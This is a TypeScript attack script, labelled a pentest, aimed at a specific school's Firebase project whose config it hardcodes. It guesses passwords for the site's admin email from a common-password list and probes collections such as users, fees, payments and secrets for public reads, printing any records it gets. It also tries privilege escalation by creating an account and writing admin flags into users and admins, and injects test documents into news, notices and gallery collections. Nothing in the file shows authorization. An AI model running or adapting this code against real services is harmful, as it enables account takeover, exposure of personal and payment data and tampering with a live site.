import { initializeApp } from "firebase/app";
import {
  getFirestore,
  collection,
  getDocs,
  addDoc,
  deleteDoc,
  limit,
  query,
  getDoc,
  doc,
  setDoc,
} from "firebase/firestore";
import {
  getAuth,
  signInAnonymously,
  createUserWithEmailAndPassword,
  signInWithEmailAndPassword,
} from "firebase/auth";

// --- CONFIGURATION ---
const firebaseConfig = {
  apiKey: "AIzaSyAU7vbyM0Z-zO4dTn9am0PxtKchU4dF1vI",
  authDomain: "gyan-niketan-admin.firebaseapp.com",
  projectId: "gyan-niketan-admin",
  storageBucket: "gyan-niketan-admin.firebasestorage.app",
  messagingSenderId: "499929214062",
  appId: "1:499929214062:web:3f948275680009f1b08a7f",
  measurementId: "G-X5HK6LWSQ9",
};

const COMMON_COLLECTIONS = [
  "users",
  "admin",
  "admins",
  "accounts",
  "students",
  "teachers",
  "staff",
  "faculty",
  "classes",
  "courses",
  "subjects",
  "fees",
  "payments",
  "transactions",
  "notices",
  "announcements",
  "news",
  "gallery",
  "uploads",
  "files",
  "config",
  "settings",
  "secrets",
  "chat",
  "messages",
  "logs",
];

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const auth = getAuth(app);

// --- UTILS ---
const RED = "\x1b[31m";
const GREEN = "\x1b[32m";
const YELLOW = "\x1b[33m";
const RESET = "\x1b[0m";

function log(type: "INFO" | "vuln" | "SECURE" | "ERROR", message: string) {
  let color = RESET;
  if (type === "vuln") color = GREEN; // Green means successfully found a vuln (good for pentester)
  if (type === "SECURE") color = RED; // Red means access denied (bad for pentester, good for security)
  if (type === "ERROR") color = YELLOW;
  console.log(`${color}[${type}] ${message}${RESET}`);
}

// --- CHECKS ---

async function checkAdminLogin() {
  console.log(`\n--- Checking Admin Brute Force ---`);
  const targetEmail = "admin@gyanniketan.com"; // Found in HTML placeholder
  const commonPasswords = [
    "admin123",
    "password",
    "Password123",
    "admin@123",
    "gyanniketan",
    "school123",
    "admin",
    "123456",
    "12345678",
    "password123",
  ];

  for (const password of commonPasswords) {
    process.stdout.write(`Trying ${targetEmail} : ${password} ... `);
    try {
      await signInWithEmailAndPassword(auth, targetEmail, password);
      log(
        "vuln",
        `SUCCESS! Valid Admin Credentials Found: ${targetEmail} / ${password}`
      );
      return true; // Stop if found
    } catch (e: any) {
      if (
        e.code === "auth/wrong-password" ||
        e.code === "auth/user-not-found" ||
        e.code === "auth/invalid-login-credentials" ||
        e.code === "auth/invalid-credential"
      ) {
        console.log(RED + "Failed" + RESET);
      } else if (e.code === "auth/too-many-requests") {
        console.log(YELLOW + "Rate Limited" + RESET);
        break; // Stop if rate limited
      } else {
        console.log(YELLOW + e.code + RESET);
      }
    }
  }
  log("INFO", "Brute force completed. No credentials found in common list.");
  return false;
}

async function checkAnonymousAuth() {
  console.log(`\n--- Checking Anonymous Authentication ---`);
  try {
    await signInAnonymously(auth);
    log(
      "vuln",
      "Anonymous Authentication is ENABLED. We are now logged in as an anonymous user."
    );
    return true;
  } catch (e: any) {
    if (e.code === "auth/admin-restricted-operation") {
      log("SECURE", "Anonymous Authentication is DISABLED.");
    } else {
      log("ERROR", `Anon Auth Check Error: ${e.message}`);
    }
    return false;
  }
}

async function checkUserRegistration() {
  console.log(`\n--- Checking Open User Registration ---`);
  const email = `pentest_${Date.now()}@example.com`;
  const password = "Password123!";
  try {
    await createUserWithEmailAndPassword(auth, email, password);
    log("vuln", `Open Registration is ENABLED. Created user: ${email}`);
    // Cleanup if possible? Deleting users requires admin SDK usually.
  } catch (e: any) {
    if (e.code === "auth/operation-not-allowed") {
      log("SECURE", "Email/Password Registration is DISABLED.");
    } else {
      log("ERROR", `Registration Check Error: ${e.message}`);
    }
  }
}

async function checkCollectionRead(colName: string) {
  try {
    // limit(1) to avoid downloading massive datasets
    const q = query(collection(db, colName), limit(1));
    const snapshot = await getDocs(q);
    if (!snapshot.empty) {
      log(
        "vuln",
        `Collection '${colName}' is PUBLICLY READABLE. Found document ID: ${snapshot.docs[0].id}`
      );
      console.log(
        `Sample Data for '${colName}':`,
        JSON.stringify(snapshot.docs[0].data(), null, 2)
      );
    } else {
      // It might be empty but readable. Try to see if it allows the request.
      log("INFO", `Collection '${colName}' is readable but EMPTY.`);
    }
  } catch (e: any) {
    if (e.code === "permission-denied") {
      // This is actually what we want to see for a secure app
      // console.log(`[SECURE] '${colName}' - Read Permission Denied.`);
      process.stdout.write("."); // Compact output for denied
    } else {
      console.log(`\n[ERROR] '${colName}' - ${e.message}`);
    }
  }
}

async function checkWriteAccess() {
  console.log(`\n--- Checking Public Write Access ---`);
  const testCol = "pentest_write_check";
  try {
    const docRef = await addDoc(collection(db, testCol), {
      msg: "This is a security test. Please delete.",
      timestamp: new Date(),
    });
    log(
      "vuln",
      `Global Write Access is ENABLED. Wrote document to '${testCol}' with ID: ${docRef.id}`
    );

    // Cleanup
    await deleteDoc(docRef);
    log("INFO", `Cleaned up test document.`);
  } catch (e: any) {
    if (e.code === "permission-denied") {
      log("SECURE", "Global Write Access is DENIED.");
    } else {
      log("ERROR", `Write Check Error: ${e.message}`);
    }
  }
}

// --- MAIN ENUMERATION ---

// --- PRIVILEGE ESCALATION ATTACK ---

async function attemptPrivilegeEscalation() {
  console.log(`\n--- Attempting Privilege Escalation ---`);
  const email = `cms_admin_${Math.floor(Math.random() * 1000)}@example.com`;
  const password = "Password123!";

  console.log(`1. Registering new account: ${email} ...`);
  let user;
  try {
    const cred = await createUserWithEmailAndPassword(auth, email, password);
    user = cred.user;
    log("vuln", `User created successfully! UID: ${user.uid}`);
  } catch (e: any) {
    log("ERROR", `Could not create user: ${e.message}`);
    return;
  }

  // Attack Vector A: Mass Assignment in 'users' collection
  console.log(`\n2. Attacking 'users' collection (Mass Assignment)...`);
  const adminPayloads = {
    email: email,
    uid: user.uid,
    createdAt: new Date(),
    role: "admin",
    isAdmin: true,
    type: "administrator",
    permissions: { all: true },
    access_level: 999,
  };

  try {
    // Try to overwrite our own user profile with admin flags
    await setDoc(doc(db, "users", user.uid), adminPayloads);
    log("vuln", `SUCCESS? Wrote 'admin' flags to users/${user.uid}.`);
    console.log(
      GREEN +
        `\n[+] POSSIBLE ADMIN ACCOUNT CREATED:\nEmail: ${email}\nPassword: ${password}\n` +
        RESET
    );
    console.log("Try logging into the CMS with these credentials.");
  } catch (e: any) {
    log("SECURE", `Failed to write to users profile: ${e.message}`);
  }

  // Attack Vector B: Write to 'admins' collection
  console.log(`\n3. Attacking 'admins' collection (Direct Write)...`);
  try {
    await setDoc(doc(db, "admins", user.uid), { email: email });
    log("vuln", `SUCCESS? Added self to 'admins' collection.`);
  } catch (e: any) {
    log("SECURE", `Failed to write to admins collection: ${e.message}`);
  }

  // Verify Read Access now
  console.log(`\n4. Verifying Access (Can we read 'users' now?)...`);
  await checkCollectionRead("users");
}

// --- DASHBOARD SPECIFIC ATTACKS ---

async function checkDashboardWriteAccess() {
  console.log(`\n--- Checking Dashboard Collections (Write Access) ---`);
  console.log("Targeting collections found in dashboard.html source...");

  // Collections found in dashboard.html: gallery, results, faculty, news, notices
  let targets = [
    { name: "gallery", data: { title: "Test", category: "General" } },
    {
      name: "news",
      data: { title: "Test News", date: "2026-01-03", summary: "Test" },
    },
    { name: "notices", data: { text: "Test Notice", link: "http://test.com" } },
    { name: "faculty", data: { name: "Test Fac", role: "Test" } },
    { name: "results", data: { title: "Test Res", url: "http://test.com" } },
  ];

  for (const t of targets) {
    process.stdout.write(`Attempting write to '${t.name}'... `);
    try {
      const payload = {
        ...t.data,
        timestamp: new Date(),
        author: "pentester", // injecting author field
      };
      const docRef = await addDoc(collection(db, t.name), payload);
      console.log(GREEN + "SUCCESS! [vuln]" + RESET);
      console.log(GREEN + `  -> Injected document ID: ${docRef.id}` + RESET);

      // Clean up?
      try {
        await deleteDoc(docRef);
        console.log("  -> Cleaned up.");
      } catch (e) {}
    } catch (e: any) {
      if (e.code === "permission-denied") {
        console.log(RED + "DENIED [SECURE]" + RESET);
      } else {
        console.log(YELLOW + `ERROR: ${e.code}` + RESET);
      }
    }
  }
}

async function runPentest() {
  // 1. Authenticate (Privilege Escalation function creates a user)
  await attemptPrivilegeEscalation();

  // 2. Dashboard Checks
  await checkDashboardWriteAccess();
}

runPentest();
